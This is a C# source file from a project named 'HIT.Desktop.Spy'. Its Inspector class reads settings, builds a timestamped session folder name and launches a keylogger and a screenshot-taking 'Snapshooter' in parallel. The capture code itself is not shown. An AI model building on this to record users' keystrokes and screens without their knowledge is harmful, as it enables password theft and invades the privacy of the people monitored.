namespace HIT.Desktop.Spy
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using System.Text;
    using System.Threading.Tasks;
    using Common.Utils;
    using Newtonsoft.Json;
    using Web.Infrastructure.Extensions;

    public class Inspector
    {
        private readonly string SessionId;
        private readonly InspectorSettings Settings;
        private readonly IList<IRunnable> ToolsActivated;

        public Inspector()
        {
            this.ToolsActivated = new List<IRunnable>();
            this.Settings = this.LoadInspectorSettings("InspectorSettings.json");
            this.SessionId = this.ComposeSessionId(this.Settings.SessionName);
        }

        public void Start()
        {
            var keylogger = new Keylogger(this.SessionId);
            var snapshooter = new Snapshooter(this.SessionId);

            this.ToolsActivated.Add(keylogger);
            this.ToolsActivated.Add(snapshooter);

            var keyloggerTask = Task.Run(() => keylogger.Start());
            var snapshooterTask = Task.Run(() => snapshooter.Start());

            Task.WaitAll(keyloggerTask, snapshooterTask);
        }

        private InspectorSettings LoadInspectorSettings(string inspectorSettingsFilePath)
        {
            if (!File.Exists(inspectorSettingsFilePath))
            {
                return InspectorSettings.DefaultSettings;
            }

            var inspectorSettingsFileContent = File.ReadAllText(inspectorSettingsFilePath);
            var inspectorSettings = JsonConvert.DeserializeObject<InspectorSettings>(inspectorSettingsFileContent);

            return inspectorSettings;
        }

        private string ComposeSessionId(string sessionName)
        {
            this.ValidateSessionName(sessionName);

            // Cache the current datetime and
            // Extract the parameters required to build the session id
            var date = DateTimeProvider.Current.Now;
            var time = date.TimeOfDay;
            var year = date.Year;
            var month = date.ToString("MMM");
            var day = date.Day;
            var hours = time.Hours.ToTimeString();
            var minutes = time.Minutes.ToTimeString();
            var seconds = time.Seconds.ToTimeString();

            // Compose the session id
            // It is used as a folder name 
            // In which to store the session data
            var sessionId = new StringBuilder(255);
            sessionId
                .Append($"[{year}-{month}-{day}]")
                .Append("-")
                .Append($"[{hours}-{minutes}-{seconds}]")
                .Append("-")
                .Append($"[{sessionName}]");

            return sessionId.ToString();
        }

        private void ValidateSessionName(string sessionName)
        {
            if (string.IsNullOrEmpty(sessionName))
            {
                throw new ArgumentNullException("The provided session name cannot be NULL or EMPTY!");
            }

            var charactersNotAllowed = new char[] { '\\', '/', '<', '>', '?', '*', ':', '|', '"', };
            if (sessionName.ContainsAny(charactersNotAllowed))
            {
                throw new InvalidOperationException($@"The session name cannot contain any of the following characters: {string.Join(" ", charactersNotAllowed)}");
            }
        }
    }

    [Serializable]
    public class InspectorSettings
    {
        private static InspectorSettings defaultSettings =
            new InspectorSettings
            {
                SessionName = Guid.NewGuid().ToString(),
                SnapshotDelay = 10000,
                KeysPressedCap = 20
            };

        public string SessionName { get; set; }

        public int SnapshotDelay { get; set; }

        public int KeysPressedCap { get; set; }

        public static InspectorSettings DefaultSettings
        {
            get
            {
                return defaultSettings;
            }
        }
    }
}
